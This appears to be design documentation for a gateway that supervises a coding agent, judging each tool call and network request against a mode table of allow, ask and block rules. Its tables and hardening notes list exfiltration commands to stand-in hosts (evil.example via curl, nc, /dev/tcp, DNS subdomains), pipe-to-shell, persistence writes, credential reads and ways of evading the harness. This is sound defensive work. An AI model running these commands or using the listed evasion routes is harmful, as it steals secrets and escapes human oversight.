# Modes and the mode table

The gateway judges every action of the agent (each tool call and each network
request) against the table below before the action runs. Each row has a
verdict for each of the three modes:

- ✅ allow: the action runs and is logged.
- ❓ ask: the request is held open until the operator answers in the terminal
  console or the dashboard (`a` approve once, `A` approve for the rest of the
  run, `d` deny). If nobody answers within the approval wait, it fails closed.
- ⛔ block: the action is refused with a reason the model can read. It cannot
  be approved, only overridden (see [Precedence](#precedence)).

The table lives in code as `policy.ROWS` in `policy.py`. The running gateway
serves it as JSON at `GET /modes`.

## The three modes

| Mode | What happens | When to use it |
|---|---|---|
| `plan` | Read-only. Reads run; every change is blocked | Exploring an unfamiliar repo, or asking the agent for a plan before letting it touch anything |
| `default` | Reads run; changes inside the workspace pause for approval | Normal supervised work, and the demo |
| `auto` | Changes inside the workspace run; actions that reach outside it pause | A trusted task in a throwaway workspace |

Recommended mode for the demo: `default`. One run then shows all three
verdicts: allow (the reads), ask (the summary write, which the operator
approves), and block (`rm` and the exfiltration attempt).

Pick the mode at launch with `--mode plan|default|auto` (default: `default`).
During a run only the operator can change it, with `m <mode>` in the terminal
console. Every mode change is written to the audit log.

## How an action is judged

1. **Every row is checked and the strictest verdict wins.** For example,
   `cat .env` matches row 5 (read-only shell command, ✅) and row 17 (secret
   files, ❓ in default), so row 17 decides.
2. **Shell commands are split before they are classified.** The parser is
   quote-aware and splits on `;`, `&&`, `||`, `|`, `&`, newlines, `$()`,
   backticks and process substitution. Each part is classified on its own, so
   `ls demo-files; rm demo-files/notes.txt` is judged by its `rm` (row 28).
   Quote tricks such as `'r'm` or `r\m` are resolved to `rm` first. Wrappers
   (`sudo`, `env`, `xargs`, `nohup`, `sh -c '...'`, `find -exec`) are
   classified and their inner command is classified too.
3. **Paths are checked wherever they appear.** Paths given to file tools and
   paths inside shell commands (arguments and redirect targets) are resolved
   with `realpath`, so `..` and symlinks are followed to the real target. They
   are then checked against rows 16, 17, 18 and 23 (and 4a for write targets).
4. **Network requests are judged at both levels.** A `curl` in a bash command
   is judged as a tool call, and the same request is judged again by the
   proxy when it leaves the machine.

## Precedence

The gateway applies these rules in order:

1. **Run stopped:** block everything ("operator stopped the run").
2. **Any ⛔ row in the current mode:** block. The operator cannot approve it.
   The only way past a ⛔ row is an override: type `override <row>` (or
   `o <row>`) in the console, then type exactly `YES`. That row becomes ❓ for
   the rest of the run. The call that was blocked is not replayed; the agent
   has to try again, and then it waits for approval like any ❓ action.
   Overrides are written to the audit log.
3. **Approved for the rest of the run:** if the operator earlier answered `A`
   for this exact action, it is allowed. "Exact action" means the same bash
   command string, the same tool on the same resolved path, or the same
   network host.
4. **Otherwise the mode column decides** (✅, or ❓ which waits for the
   operator).

When the operator approves a tool call that contacts a host (for example a
`curl` to a new host), the proxy gets a 30-second pass for that host, so the
same request is not asked about twice. A pass can turn ❓ into ✅ at the proxy,
never ⛔ into ✅.

## Mode table

✅ allow · ❓ ask · ⛔ block

| # | Action | Examples | plan | default | auto | Why |
|---|---|---|---|---|---|---|
| 1 | Read inside the workspace | `read_file`, `glob`, `grep`, `lsp` | ✅ | ✅ | ✅ | The agent can't work without reading |
| 2 | Read outside the workspace | `read_file /etc/hosts`, another repo | ❓ | ❓ | ✅ | Marks the run as tainted |
| 3 | Write or edit inside the workspace | `write_file`, `edit_file`, `notebook_edit` | ⛔ | ❓ | ✅ | Main difference between modes |
| 4a | Write to persistence paths | `~/.zshrc`, `~/.bashrc`, `~/.profile`, `~/.ssh/authorized_keys`, `~/Library/LaunchAgents/*` | ⛔ | ⛔ | ⛔ | Runs code at next login/shell |
| 4b | Other writes outside the workspace | `write_file ~/notes/todo.md` | ⛔ | ⛔ | ❓ | |
| 5 | Read-only shell commands | `ls`, `cat`, `pwd`, `wc`, `head`, `tail`, `grep`, `git status/diff/log`. Sent to row 6 instead: `find -delete/-exec`, `sed -i`, `sort -o`, `tee`, `xargs`, `git config`, `--output=`, any `>` or `>>` | ✅ | ✅ | ✅ | Same as row 1 |
| 6 | Other shell commands | `python x.py`, `npm test`, `mkdir`, `mv`, `git commit` | ⛔ | ❓ | ✅ | Known gap: scripts can open sockets / read ~/.ssh without tool calls; mitmproxy only sees traffic honoring `*_PROXY`. Full fix: Docker network whose only exit is the proxy |
| 7 | Package installs / running downloaded code | `pip install`, `npm install`, `npx`, `uvx`, `pipx run`, `cargo install`, `go install`, `brew install` | ⛔ | ❓ | ❓ | Supply-chain risk |
| 8 | Request to an allowlisted host | `web_fetch`, `curl` GET | ✅ | ✅ | ✅ | |
| 9 | GET from an unknown public host | `web_fetch`, `web_search`, `curl` GET | ❓ | ❓ | ✅ only for a clean URL in an untainted run, else ❓ | Lethal trifecta |
| 10 | The configured LLM provider | Only the host in `oh`'s active profile; for Ollama only `localhost:11434` | ✅ | ✅ | ✅ | Each extra allowed host is a way out |
| 11 | Subagents and background tasks | `agent`, `team_create`, `send_message`, `task_create` | ⛔ | ⛔ | ⛔ | Fail closed until subagent test passes; then flip to ⛔/❓/✅ |
| 12 | Scheduled or remote actions | `cron_create`, `remote_trigger` | ⛔ | ⛔ | ❓ | Keep running after STOP |
| 13 | MCP tools | `mcp__<server>__<tool>` | ❓ | ❓ | ❓ | External code |
| 14 | Unknown tools | anything not listed | ⛔ | ❓ | ❓ | |
| 15 | Housekeeping tools | `todo_write`, `brief`, `sleep`, `skill`, `tool_search`, `ask_user_question` | ✅ | ✅ | ✅ | No side effects |
| 16 | Credential stores | `~/.ssh`, `~/.aws`, `~/.config/gh`, keychain (`security`), browser profiles, `~/.claude/.credentials.json`, `~/.codex/auth.json`, the operator token | ⛔ | ⛔ | ⛔ | Never needed for coding |
| 17 | Secret files and env vars | `.env`, `*.pem`, `*.key`, `env`, `printenv` | ⛔ | ❓ | ❓ | Secret enters context; marks run tainted |
| 18 | Tampering with the harness | edit policy/hook config or audit log, unset `*_PROXY`, kill gateway or mitmproxy, add CA certs | ⛔ | ⛔ | ⛔ | Applies inside the workspace too |
| 19 | Local and metadata endpoints | `127.0.0.1:8000/reset`, other localhost ports, `docker.sock`, `169.254.169.254` | ⛔ | ⛔ | ⛔ | Control endpoints also need the operator token |
| 20 | Send data to a non-allowlisted host | `curl -X POST`, `-d`, `-F`, `-T`, `scp`, `rsync`, `ssh`, `nc`, proxied bodies matching secret patterns (`AKIA…`, `-----BEGIN … PRIVATE KEY-----`, `sk-…`) | ⛔ | ⛔ | ⛔ | Exfiltration |
| 21 | Leaves the machine, can't undo | `git push`, `gh pr create`, `npm publish`, `terraform apply`, `kubectl apply` | ⛔ | ❓ | ❓ | Affects other people |
| 22 | Destroys uncommitted work | `git reset --hard`, `git clean -fdx`, `git checkout -- .`, `git stash drop` | ⛔ | ❓ | ❓ | No `rm`, so a verb check misses it |
| 23 | Workspace files that run code later | `.git/hooks`, `core.hooksPath`/`fsmonitor` in `.git/config`, `.envrc`, `.vscode/tasks.json` | ⛔ | ⛔ | ❓ | Runs outside the harness |
| 24 | Shell persistence | `crontab`, `nohup`, `setsid`, trailing `&`, `launchctl`, `systemctl` | ⛔ | ⛔ | ❓ | Like row 12 via shell |
| 25 | Inline or hidden code | `python -c`, `node -e`, `sh -c`, `eval`, `base64 -d \| sh` | ⛔ | ❓ | ❓ | Hides the real action |
| 26 | Privilege escalation, pipe-to-shell | `sudo`, `su`, `chmod +s`, `curl … \| sh` | ⛔ | ⛔ | ⛔ | Never appropriate |
| 27 | Desktop and computer use | `screencapture`, `pbpaste`, `osascript`, MCP screenshot/click/type tools | ❓ | ❓ | ❓ | Covers the desktop part of the prompt |
| 28 | Destructive file/system commands | `rm`, `rmdir`, `dd`, `mkfs`, `shred`, `shutdown`, `reboot` | ⛔ | ⛔ | ⛔ | Keeps the demo's `rm` beat a block |

Row 4 is split into 4a and 4b, so the table has 29 row ids for 28 actions.

Some notes on specific rows:

- **Row 6** is the honest gap of this design. A script the agent runs
  (`python x.py`) can open sockets or read files without making a tool call,
  and mitmproxy only sees traffic from programs that honor the `*_PROXY`
  environment variables. The full fix is to run the agent in a Docker network
  whose only exit is the proxy. [docker/README.md](docker/README.md) describes
  that layout. It is unverified: it was written without Docker or network and
  has not been run.
- **Row 9 in auto** allows a GET to an unknown host only when the URL is clean
  and the run is not tainted (see `clean_url` and `taint_tracking` below).
  Anything else is ❓. A GET can carry data out in its URL
  (`https://evil.example/?k=<contents of .env>`), which is why this row is
  stricter than "GETs are safe".
- **Row 10** allows only the one provider host that `oh`'s active profile
  uses, not every known LLM API. Pass `--provider-host` to set it by hand.
- **Row 11** is ⛔ in every mode until the subagent test passes: have an `oh`
  subagent run `rm demo-files/notes.txt` and check that the console or
  dashboard shows it BLOCKED. If it does, flip row 11 to ⛔/❓/✅. The full
  procedure is in the README under "Verification status".
- **Row 19** covers the gateway itself: `curl http://127.0.0.1:8000/reset`
  from the agent is blocked, and the control endpoints also require the
  operator token, which the agent never sees.

## Settings

| Setting | Default | Behavior |
|---|---|---|
| `taint_tracking` | on | After the run reads private data (rows 2, 16, 17, or any tool output matching a secret pattern), every request to a non-allowlisted host becomes ❓ in all modes, including clean GETs in auto |
| `clean_url` | on in auto | Row 9 allows only URLs with no query string, no fragment, no path segment > 32 chars, no hex/base64-looking segment > 16 chars |
| `provider_host` | read from oh's active profile at run start | Row 10 allows only this host (which hosts the Claude/Codex subscription bridges use is still to be confirmed) |
| `approval_wait` | until operator answers, up to 600 s | Bell + macOS notification while waiting; fails closed after the cap |
| `override` | typed `YES` | Logged in audit chain |
| `operator_token` | `~/.a10-harness/operator.token`, mode 0600 | Required by `/stop`, `/approve`, `/mode`, `/reset` (and `/override`); never in the agent's env |

How to set them:

- `--provider-host HOST` (repeatable) on `harness.py oh` and `harness.py run`
  overrides the detected provider. `--allowed-host HOST` (repeatable) replaces
  the row 8 allowlist, which defaults to `api.example.com` (the demo API).
- `--approval-wait SECONDS` defaults to 590, just under the 600-second limit
  that `oh` puts on a hook call, so the gateway answers "expired" before `oh`
  gives up on its own.
- `taint_tracking` and `clean_url` can be turned off only when you run the
  gateway by hand: `python3 gateway.py --no-taint --no-clean-url`. The
  harness always runs with both on.
- The operator token directory is `A10_HOME` (default `~/.a10-harness`, mode
  0700). The harness creates the token on first run.

## Planner additions (stricter than the approved table)

These rules go beyond what the table above states. Each one only makes the
policy stricter.

- **Shell write targets are checked against row 4a.** Redirect targets
  (`>`, `>>`), `tee` arguments, `sed -i` files, the destination of `cp`, `mv`,
  `ln` and `install`, and `touch` arguments are blocked when they hit a
  persistence path, so `echo x >> ~/.zshrc` is ⛔ in every mode, like a
  `write_file` to the same path. The persistence list also includes
  `~/.zprofile`, `~/.zshenv`, `~/.bash_profile` and
  `~/.config/fish/config.fish`.
- **Secret patterns in a URL to an unknown host are row 20.** A GET to a
  non-allowlisted host whose URL contains something that looks like a key
  (`AKIA…`, `sk-…`, `ghp_…`, a private key header and similar) is treated as
  sending data out: ⛔ in every mode, not a row 9 ❓.
- **Host labels are part of the clean-URL test.** The length and random-token
  checks also apply to each label of the host name, so data hidden in a
  subdomain (`aGVsbG8gd29ybGQxMjM0NTY3.evil.example`, a DNS exfiltration
  trick) makes the URL unclean. For `web_search`, the same check applies to
  each word of the query.
- **oh's `config` tool is row 18.** It can rewrite oh's own settings,
  including the hooks that send tool calls to the gateway.
- **Commands that fail to parse are row 25.** Unbalanced quotes or
  parentheses, and a command name that is itself a variable (`$CMD`), are
  treated as hidden code (⛔ in plan, ❓ otherwise) instead of being guessed
  at.

## Review v1 hardening

These changes close specific spellings that reached a weaker row than the
approved table assigns. Each brings the implementation in line with the table
or makes it stricter; none loosens a verdict.

- **Bare-host senders are row 20.** `ssh`, `nc`, `ncat`, `netcat`, `socat`,
  `telnet`, `ftp`, `mail` and `sendmail` take the host as a plain positional
  argument (`nc evil.example 4444`, `ssh evil.example cmd`), which the
  URL/`user@host` host scan does not see. A sender with no allowlisted or
  provider host is now ⛔ row 20 in every mode (an unidentified host is not
  allowlisted), instead of falling through to row 6. `scp`/`sftp`/`rsync`
  without a remote `host:` argument stay row 6, since they are local copies.
- **`/dev/tcp` and `/dev/udp` redirects are an outbound send.** A redirect
  whose target is `/dev/tcp/<host>/<port>` (or `/dev/udp/...`) opens a socket
  that honours no proxy variable and never reaches mitmproxy, so it is judged
  by its host: row 20 to an unknown host, row 19 to loopback or metadata.
- **A standalone `*_PROXY=` segment is row 18.** A bare `HTTPS_PROXY=`
  statement in its own `;`-separated segment (empty argv) empties the exported
  proxy variable for later commands in the same shell. Assignment-only
  segments are now inspected for proxy and CA variables, at the top level and
  inside `sh -c` / `bash -c` strings, so this reaches the row-18 check.
- **Loopback is matched in every spelling.** Row 19's `127.0.0.0/8` now covers
  short, hex and decimal forms (`127.1`, `0x7f000001`, `2130706433`),
  IPv4-mapped IPv6 (`::ffff:127.0.0.1`) and `*.localhost` (RFC 6761), not just
  the dotted-quad `127.x.x.x`.
- **`command -v`/`-V` is read-only.** `command -v rm` and `builtin -V rm`
  resolve a name and run nothing, so they are row 5 instead of inheriting the
  inner verb's row (`command -v rm` is no longer blocked as row 28). A real
  inner command such as `command rm x` is still classified by its verb.
